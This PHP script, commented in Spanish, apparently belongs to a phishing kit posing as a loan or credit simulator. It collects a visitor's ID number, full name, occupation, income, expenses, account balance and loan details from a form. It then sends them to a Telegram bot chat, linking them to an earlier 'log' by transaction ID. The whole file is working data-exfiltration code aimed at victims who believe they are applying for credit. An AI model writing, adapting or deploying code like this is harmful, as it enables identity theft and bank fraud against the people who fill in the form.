<?php
// process_credit_data.php
// (AHORA SOLO PROCESA EL CRÉDITO)

header('Content-Type: application/json');

// 1. Cargar la configuración principal
$config = require 'conexion.php';

// 2. Obtener el ID de la solicitud (viene por GET)
$transaction_id = $_GET['id'] ?? null;

if (!$transaction_id) {
    echo json_encode(['status' => 'error', 'message' => 'ID de transacción no proporcionado.']);
    exit;
}

// --- Lógica de Telegram ---
$telegram_config = $config['telegram'];
if (!isset($telegram_config['bot_token']) || !isset($telegram_config['chat_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Error de configuración de Telegram.']);
    exit;
}

$botToken = $telegram_config['bot_token'];
$chatId = $telegram_config['chat_id'];

// --- Captura de datos del crédito (vienen por POST) ---
// El JS los envía sin prefijo
$credito_monto_raw = $_POST['montoCredito'] ?? 0;
$credito_ingresos_raw = $_POST['ingresoMensual'] ?? 0;
$credito_gastos_raw = $_POST['gastosMensual'] ?? 0;
$credito_saldo_raw = $_POST['saldoActual'] ?? 0;

// Formatear números como moneda para Telegram
$credito_monto = '$' . number_format($credito_monto_raw, 0, ',', '.');
$credito_ingresos = '$' . number_format($credito_ingresos_raw, 0, ',', '.');
$credito_gastos = '$' . number_format($credito_gastos_raw, 0, ',', '.');
$credito_saldo = '$' . number_format($credito_saldo_raw, 0, ',', '.');

// Captura del resto de datos de crédito
$credito_tipo_doc = $_POST['tipoDocCredito'] ?? 'No especificado';
$credito_cedula = $_POST['cedula'] ?? 'No especificado';
$credito_nombre = $_POST['nombreCompleto'] ?? 'No especificado';
$credito_ocupacion = $_POST['ocupacion'] ?? 'No especificado';
$credito_plazo = $_POST['plazo'] ?? 'No especificado';
$credito_fecha_pago = $_POST['fechaPago'] ?? 'No especificado';

// --- Añadir datos del crédito al mensaje de Telegram ---
$message = "💰 *Datos del Crédito Simulado* 💰\n";
$message .= "*(Asociado al ID: `...". substr($transaction_id, -6) ." `)*\n\n"; // Para asociarlo al log anterior
$message .= "› *Monto Solicitado:* `" . htmlspecialchars($credito_monto) . "`\n";
$message .= "› *Tipo Doc (Crédito):* " . htmlspecialchars($credito_tipo_doc) . "\n";
$message .= "› *Cédula (Crédito):* `" . htmlspecialchars($credito_cedula) . "`\n";
$message .= "› *Nombre (Crédito):* " . htmlspecialchars($credito_nombre) . "\n";
$message .= "› *Ocupación:* " . htmlspecialchars($credito_ocupacion) . "\n";
$message .= "› *Ingresos:* `" . htmlspecialchars($credito_ingresos) . "`\n";
$message .= "› *Gastos:* `" . htmlspecialchars($credito_gastos) . "`\n";
$message .= "› *Saldo Cuenta:* `" . htmlspecialchars($credito_saldo) . "`\n";
$message .= "› *Plazo:* " . htmlspecialchars($credito_plazo) . " meses\n";
$message .= "› *Fecha de Pago:* Día " . htmlspecialchars($credito_fecha_pago) . "\n";

$post_fields = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown',
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$result = curl_exec($ch);
curl_close($ch);

// Devolver éxito al JavaScript
echo json_encode(['status' => 'success', 'message' => 'Datos de crédito enviados.', 'telegram_result' => $result]);
exit;
?>